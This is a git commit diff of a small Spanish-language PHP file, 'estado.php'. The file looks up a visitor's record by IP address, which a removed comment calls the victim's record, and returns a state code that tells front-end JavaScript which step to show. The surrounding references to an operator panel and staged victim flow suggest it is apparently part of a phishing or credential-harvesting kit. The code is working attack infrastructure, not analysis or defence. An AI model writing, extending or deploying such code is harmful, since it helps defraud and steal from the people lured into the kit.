f03af8115292e605d11cd9e9697ab5c1350c2f93
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-21 23:00:10 -0500

    Actualizar estado.php

--- process/estado.php
+++ process/estado.php
@@ -1,20 +1,16 @@
+
 <?php
 require_once('../panel/lib/funciones.php');
-
 $ip = $_SERVER['REMOTE_ADDR'];
 
-// Consultamos el registro de la víctima por su IP
 if (function_exists('traer_regitro')) {
     $registro = traer_regitro($ip);
-    
-    // Si existe el registro, enviamos el estado actual (2, 4, 6, 10, etc.)
     if ($registro) {
-        echo trim($registro['estado']);
+        echo trim($registro['estado']); // Esto le dirá al JS si ir a 2, 4 o 6
     } else {
         echo "0";
     }
 } else {
-    // Si la función no existe, devolvemos 0 para evitar errores
     echo "0";
 }
 ?>
